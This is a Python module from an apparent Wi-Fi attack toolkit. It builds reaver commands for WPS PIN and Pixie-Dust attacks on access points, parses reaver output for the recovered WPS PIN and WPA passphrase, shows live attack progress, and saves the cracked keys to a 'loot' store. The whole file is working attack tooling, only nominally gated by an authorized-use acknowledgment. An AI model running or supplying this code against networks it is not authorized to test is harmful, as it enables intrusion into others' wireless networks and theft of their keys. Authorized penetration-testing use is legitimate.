"""WPS PIN attacks (reaver + pixiewps): command building, output parsing, a
live-progress readout, and writing a recovered key into the crack loot store.

A whole attack class separate from handshake capture: WPS-enabled APs can leak
the WPA PSK via a weak/registrar-PIN flow (notably the offline **Pixie-Dust**
attack). This module is the pure, testable part — the ``kestrel wps`` CLI drives
the radio (it transmits, so it is gated by the authorized-use acknowledgment and
pauses capture while it runs). Stdlib only; recovered keys land in the same loot
store as cracked handshakes, so ``/loot`` shows them together.

Live view: a reaver run is seconds (Pixie-Dust) to hours (online PIN brute), and
it used to be buffered — the operator saw nothing until it exited. The CLI now
streams reaver's ``-vv`` output through :func:`live_attack` (``python -m
kestrel_pi.wps live``), which echoes it to the console/journal and writes a
small, secret-free ``attack-progress.json`` the ``/wps`` page overlays live —
the same shape and idea as the crack worker's ``crack-progress.json``. The file
never holds the recovered PSK or PIN (those go only to the loot store); it
carries stage, percent, rate and a scrubbed status line.
"""
from __future__ import annotations

import collections
import json
import os
import re
import sys
import time

from . import device_id
from .crack import CRACK_DIR
from .crack.store import LootStore

REAVER = "reaver"

# Where the `kestrel wps` CLI keeps its live state (mirrors web.WPS_DIR). The
# live-progress file lives here; it is pi-written (the live filter runs as pi)
# and world-readable so the daemon (also pi) can overlay it on the /wps page.
WPS_DIR = "/var/lib/kestrel/wps"
PROGRESS_NAME = "attack-progress.json"

# How recent attack-progress.json must be for the live numbers to count as
# "now". reaver can go quiet for a while during beacon-wait/association, so the
# /wps page falls back to a generic "working" line (driven by the state file)
# rather than hiding the attack when the detail is stale.
STALE_SECONDS = 25


def build_reaver_cmd(iface, bssid, channel=None, pixie=True, extra=()):
    """argv for a reaver run against ``bssid`` on ``iface`` (a monitor interface).
    ``pixie`` adds ``-K 1`` (Pixie-Dust: offline, fast when the AP is vulnerable);
    without it reaver falls back to the online PIN flow. ``-vv`` so the PIN/PSK
    lines are printed for :func:`parse_reaver_output`."""
    cmd = [REAVER, "-i", str(iface), "-b", str(bssid), "-vv"]
    if channel:
        cmd += ["-c", str(channel)]
    if pixie:
        cmd += ["-K", "1"]
    cmd += [str(x) for x in (extra or ())]
    return cmd


_PIN_RE = re.compile(r"WPS PIN:\s*'?(\d{4,})'?")
_PSK_RE = re.compile(r"WPA PSK:\s*'([^']*)'")
_SSID_RE = re.compile(r"(?:AP SSID|SSID):\s*'([^']*)'")


def parse_reaver_output(text):
    """Extract ``{pin, psk, essid}`` from reaver ``-vv`` output. Keys are absent
    when not found (a run that didn't recover anything returns ``{}``). An empty
    PSK string ``''`` (an open/leaked-empty result) still counts as present."""
    out = {}
    text = text or ""
    m = _PIN_RE.search(text)
    if m:
        out["pin"] = m.group(1)
    m = _PSK_RE.search(text)
    if m:
        out["psk"] = m.group(1)
    m = _SSID_RE.search(text)
    if m:
        out["essid"] = m.group(1)
    return out


def record_to_loot(bssid, essid, psk, pin="", crack_dir=CRACK_DIR, now=None):
    """Write a WPS-recovered PSK into the crack loot store (so it shows on the
    ``/loot`` page beside cracked handshakes). Keyed by BSSID like any loot;
    returns False when the BSSID is unusable."""
    now = time.time() if now is None else now
    store = LootStore(crack_dir)
    aps = store.load()
    rec = LootStore.upsert(aps, {"bssid": bssid, "essid": essid or "",
                                 "type": "wps", "hashlines": 0, "files": []},
                           now=now)
    if rec is None:
        return False
    LootStore.mark_cracked(rec, psk, "WPS (pin %s)" % pin if pin else "WPS",
                           now=now)
    rec["source"] = "wps"
    rec["wps_pin"] = pin or ""
    rec["device"] = device_id.label(bssid=bssid, essid=essid or "")
    store.save(aps)
    return True


# --- Live progress ----------------------------------------------------------
# The pure, testable half: turn a tail of reaver's running `-vv` output into a
# compact, SECRET-FREE status, and the small JSON file the /wps page reads.

_RP_PCT = re.compile(r"([\d.]+)\s*%\s*complete", re.I)
_RP_RATE = re.compile(r"\(\s*([\d.]+)\s*seconds?/pin\s*\)", re.I)

# Redactions so a status line that reaches attack-progress.json / the page can
# never leak the recovered PSK or PIN (those belong only in the loot store).
_SECRET_SUBS = (
    (re.compile(r"(WPA\s*PSK\s*:\s*)'[^']*'", re.I), r"\1(see Loot)"),
    (re.compile(r"(WPS\s*PIN\s*:\s*)'?\d{3,}'?", re.I), r"\1(see Loot)"),
    (re.compile(r"(Trying\s+pin\s*)[\"']?\d{3,}[\"']?", re.I), r"\1####"),
)


def _scrub(line):
    """Redact a recovered PIN/PSK (and a trial pin) from a status line."""
    for rx, repl in _SECRET_SUBS:
        line = rx.sub(repl, line)
    return line


def _last(rx, text, group=1):
    """The last match of ``rx`` in ``text`` (reaver repaints/advances, so the
    latest line wins), or ``None``."""
    found = None
    for found in rx.finditer(text):
        pass
    return found.group(group) if found else None


def parse_reaver_progress(text):
    """Latest live status from a tail of reaver ``-vv`` output. Returns a dict
    with ``stage`` (always) plus whatever it could read -- ``percent`` (float),
    ``rate`` (str, e.g. ``"3 s/pin"``), ``associated``/``locked`` (bool) and a
    scrubbed ``last`` status line. Never includes the recovered PIN/PSK."""
    text = text or ""
    low = text.lower()
    out = {}
    pct = _last(_RP_PCT, text)
    if pct is not None:
        try:
            out["percent"] = float(pct)
        except ValueError:
            pass
    rate = _last(_RP_RATE, text)
    if rate is not None:
        out["rate"] = rate + " s/pin"
    out["associated"] = "associated with" in low
    locked = ("rate limiting" in low or "ap locked" in low
              or "wps lock" in low or "detected ap rate" in low)
    if locked:
        out["locked"] = True
    if _PSK_RE.search(text) or "wps pin:" in low:
        stage = "recovered"
    elif "pin not found" in low or "failed to recover" in low:
        stage = "failed"
    elif locked:
        stage = "rate-limited"
    elif "pixiewps" in low or "pixie-dust" in low or "running pixie" in low:
        stage = "pixie-dust"
    elif out.get("percent") is not None or "trying pin" in low:
        stage = "pin-brute"
    elif out.get("associated"):
        stage = "associated"
    elif "waiting for beacon" in low:
        stage = "waiting"
    else:
        stage = "starting"
    out["stage"] = stage
    for ln in reversed(text.splitlines()):
        if ln.strip():
            out["last"] = _scrub(ln.strip())[:160]
            break
    return out


def progress_path(wps_dir=WPS_DIR):
    return os.path.join(wps_dir, PROGRESS_NAME)


def write_progress(wps_dir, data, now=None):
    """Write ``attack-progress.json`` atomically and world-readable. Stamps
    ``updated_at`` so the reader can tell live from stale. Best-effort."""
    record = dict(data or {})
    record["updated_at"] = time.time() if now is None else now
    path = progress_path(wps_dir)
    tmp = path + ".tmp"
    try:
        os.makedirs(wps_dir, exist_ok=True)
        with open(tmp, "w", encoding="utf-8") as handle:
            json.dump(record, handle)
        os.chmod(tmp, 0o644)
        os.replace(tmp, path)
    except OSError:
        try:
            os.unlink(tmp)
        except OSError:
            pass
    return record


def read_progress(wps_dir=WPS_DIR):
    """The last-written progress dict, or ``None`` if absent/malformed."""
    try:
        with open(progress_path(wps_dir), "r", encoding="utf-8") as handle:
            data = json.load(handle)
    except (OSError, ValueError):
        return None
    return data if isinstance(data, dict) else None


def clear_progress(wps_dir=WPS_DIR):
    """Remove ``attack-progress.json``. Missing file is fine."""
    try:
        os.unlink(progress_path(wps_dir))
    except OSError:
        pass


def is_fresh(progress, now=None, max_age=STALE_SECONDS):
    """True when ``progress`` was written within ``max_age`` seconds and the run
    is still going -- so a reader shows live numbers rather than a leftover."""
    if not isinstance(progress, dict):
        return False
    if progress.get("done"):
        return False
    stamp = progress.get("updated_at")
    if not isinstance(stamp, (int, float)):
        return False
    now = time.time() if now is None else now
    return (now - stamp) <= max_age


def _final_outcome(found, text):
    """Classify a finished run from the accumulated parse + full text."""
    if found.get("psk") is not None:
        return "recovered"
    low = (text or "").lower()
    if "pin not found" in low or "failed to recover" in low:
        return "failed"
    if ("rate limiting" in low or "ap locked" in low or "wps lock" in low):
        return "rate-limited"
    return "ended"


def live_attack(stream, wps_dir=WPS_DIR, bssid="", crack_dir=CRACK_DIR,
                essid_hint="", echo=None, now=None, flush_interval=1.0,
                tail_lines=400):
    """Consume reaver ``-vv`` output from ``stream`` line by line: echo each line
    (so the console/journal stay live), keep a bounded tail for the live status,
    and write ``attack-progress.json`` at most every ``flush_interval`` seconds.
    At EOF, parse the whole run, record any recovered key to the loot store, and
    write a final ``done`` record. Returns ``{outcome, recorded, essid}``.

    Runs as ``pi`` (the loot store and the progress file are pi-owned). The
    progress file is kept secret-free; the PSK/PIN go only to the loot store."""
    now = time.time if now is None else now
    echo = sys.stdout if echo is None else echo
    bssid = (bssid or "").upper()
    started = now()
    tail = collections.deque(maxlen=tail_lines)
    found = {}
    last_flush = [0.0]

    def flush(done=False, outcome=""):
        prog = parse_reaver_progress("\n".join(tail))
        rec = {"bssid": bssid,
               "essid": found.get("essid", essid_hint) or "",
               "started_at": started,
               "stage": (outcome if (done and outcome) else prog.get("stage")),
               "done": bool(done)}
        for key in ("percent", "rate", "locked", "associated", "last"):
            if key in prog:
                rec[key] = prog[key]
        if done:
            rec["outcome"] = outcome
        write_progress(wps_dir, rec, now=now())

    clear_progress(wps_dir)
    flush()                                      # initial "starting" record
    for raw in iter(stream.readline, ""):
        tail.append(raw.rstrip("\n"))
        found.update(parse_reaver_output(raw))   # capture pin/psk/essid as seen
        try:
            echo.write(raw)
            echo.flush()
        except (OSError, ValueError):
            pass
        moment = now()
        if moment - last_flush[0] >= flush_interval:
            last_flush[0] = moment
            flush()

    full = "\n".join(tail)
    for key, val in parse_reaver_output(full).items():
        found.setdefault(key, val)
    outcome = _final_outcome(found, full)
    recorded = False
    psk = found.get("psk")
    if psk is not None:
        recorded = record_to_loot(bssid, found.get("essid", ""), psk,
                                  found.get("pin", ""), crack_dir=crack_dir,
                                  now=now())
        if recorded:
            outcome = "recovered"
    flush(done=True, outcome=outcome)
    return {"outcome": outcome, "recorded": recorded,
            "essid": found.get("essid", "")}


def _main(argv=None):
    import argparse

    parser = argparse.ArgumentParser(prog="kestrel_pi.wps")
    sub = parser.add_subparsers(dest="cmd")
    live = sub.add_parser("live", help="stream reaver output from stdin")
    live.add_argument("--dir", default=WPS_DIR)
    live.add_argument("--bssid", default="")
    live.add_argument("--crack-dir", default=CRACK_DIR)
    live.add_argument("--essid", default="")
    args = parser.parse_args(argv)
    if args.cmd != "live":
        parser.print_help()
        return 2
    res = live_attack(sys.stdin, wps_dir=args.dir, bssid=args.bssid,
                      crack_dir=args.crack_dir, essid_hint=args.essid)
    if res.get("recorded"):
        print("recovered a key -- saved to the loot store (see the Loot page)")
    elif res.get("outcome") == "failed":
        print("no key recovered (the AP may be WPS-locked or not vulnerable)")
    elif res.get("outcome") == "rate-limited":
        print("the AP is rate-limiting WPS; no key recovered")
    else:
        print("WPS run ended; no key recovered")
    return 0


if __name__ == "__main__":
    raise SystemExit(_main())
